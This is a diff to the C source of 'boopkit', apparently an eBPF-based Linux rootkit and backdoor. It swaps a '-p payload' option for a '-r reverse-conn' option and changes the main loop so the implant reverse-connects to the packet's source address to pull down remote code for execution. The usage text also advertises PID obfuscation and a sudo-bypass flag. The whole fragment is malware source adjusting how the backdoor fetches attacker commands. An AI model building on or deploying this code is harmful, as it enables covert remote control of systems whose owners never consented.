@@ -62,7 +62,7 @@ void usage() {
   boopprintf("-h, help           Display help and usage for boopkit.\n");
   boopprintf("-i, interface      Interface name. lo, eth0, wlan0, etc\n");
   boopprintf("-s, sudo-bypass    Bypass sudo check. Breaks PID obfuscation.\n");
-  boopprintf("-p, payload        Search xCap for payload. No reverse conn.\n");
+  boopprintf("-r, reverse-conn   Attempt a reverse RCE lookup if no payload found.\n");
   boopprintf("-q, quiet          Disable output.\n");
   boopprintf("-x, reject         Source addresses to reject triggers from.\n");
   boopprintf("\n");
@@ -123,13 +123,13 @@ struct config {
   char pr0bexdppath[PATH_MAX];
   char dev_name[16];
   int denyc;
-  int payload;
+  int reverseconn;
   char deny[MAX_DENY_ADDRS][INET_ADDRSTRLEN];
 } cfg;
 
 void clisetup(int argc, char **argv) {
   cfg.denyc = 0;
-  cfg.payload = 0;
+  cfg.reverseconn = 0;
   cfg.sudobypass = 0;
   strncpy(cfg.dev_name, "lo", 16);
   if (getenv("HOME") == NULL) {
@@ -154,8 +154,8 @@ void clisetup(int argc, char **argv) {
         case 'h':
           usage();
           break;
-        case 'p':
-          cfg.payload = 1;
+        case 'r':
+          cfg.reverseconn = 1;
           break;
         case 'i':
           strcpy(cfg.dev_name, argv[i + 1]);
@@ -408,7 +408,6 @@ int main(int argc, char **argv) {
       //  boopprintf("  ** Boop EVENT_SRC_RECEIVE_RESET\n");
       //}
 
-
       // Always check for RCE in the ring buffer.
       char *rce = malloc(MAX_RCE_SIZE);
       int xcap_found;
@@ -421,7 +420,7 @@ int main(int argc, char **argv) {
         continue;
       }
 
-      if (!cfg.payload) {
+      if (cfg.reverseconn) {
         boopprintf("  -> Reverse connect() %s for RCE\n", saddrval);
         int retval;
         retval = recvrce(saddrval, rce);
@@ -432,7 +431,6 @@ int main(int argc, char **argv) {
           continue;
         }
       }
-
 
       bpf_map_delete_elem(fd, &jkey);
       ikey = jkey;
